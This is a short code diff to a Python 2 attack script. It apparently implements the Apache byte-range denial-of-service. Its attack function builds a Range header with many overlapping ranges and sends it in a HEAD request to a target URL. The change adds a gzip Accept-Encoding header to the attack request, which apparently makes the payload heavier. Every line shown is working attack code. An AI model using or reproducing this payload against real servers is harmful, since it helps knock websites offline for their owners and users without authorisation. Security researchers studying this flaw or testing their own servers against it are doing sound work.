@@ -47,7 +47,7 @@ def attack(url, user_agent=None, proxy=None):
             print "(i) Checking target for vulnerability..."
         payload = "bytes=0-,%s" % ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
         try:
-            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload }
+            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip' }
             req = _MethodRequest(url, None, headers)
             req.set_method('HEAD')
             response = urllib2.urlopen(req)
